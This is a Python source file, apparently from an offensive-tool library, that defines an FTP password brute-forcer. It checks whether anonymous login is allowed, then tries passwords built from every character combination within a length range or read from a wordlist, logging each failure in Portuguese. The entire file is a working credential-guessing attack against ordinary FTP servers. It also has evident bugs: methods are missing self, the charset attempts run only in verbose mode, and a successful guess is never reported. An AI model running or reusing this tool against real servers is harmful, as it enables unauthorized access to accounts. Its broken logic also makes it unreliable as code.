from ftplib import FTP
import ftplib
from thglibs.auxiliares.debug.debug import Debug
import itertools


class ftp_brute:
    def __init__(self, hostname, user, minimo, maximo, char, filebr=""):
        self.hostname = hostname
        self.user = user
        self.minimo = minimo
        self.maximo = maximo
        self.char = char
        self.filebr = filebr

    def check_anonymous_login(hostname):
        try:
            ftp = FTP(hostname)
            ftp.login()
            Debug.CRITICAL("[+]Anonymous => [ok]")
            Debug.CRITICAL("[+]Username  => [anonymous]")
            Debug.CRITICAL("[+]Pass      => [anonymous]")
            ftp.quit()
        except:
            Debug.AVISO("[+]Anonymous off")
            pass

    def ftp_brute_char(hostname, user, minimo, maximo, char, verbose=""):
        min = minimo
        max = maximo
        chrs = char
        min_length, max_length = int(min), int(max)
        for n in range(min_length, max_length + 1):
            for xs in itertools.product(chrs, repeat=n):
                if verbose == True:
                    passw = ''.join(xs)
                    try:
                        FTP(hostname, user, passw)
                    except ftplib.all_errors:
                        Debug.ERRO("[+]senha errada => %s" % passw)

    def ftp_brute_file(hostname, user, filebr, verbose=""):
        with open(filebr, "r") as fl:
            for passw in fl:
                try:
                    FTP(hostname, user, passw)
                except ftplib.all_errors:
                    Debug.ERRO("[+]senha errada => %s" % passw)
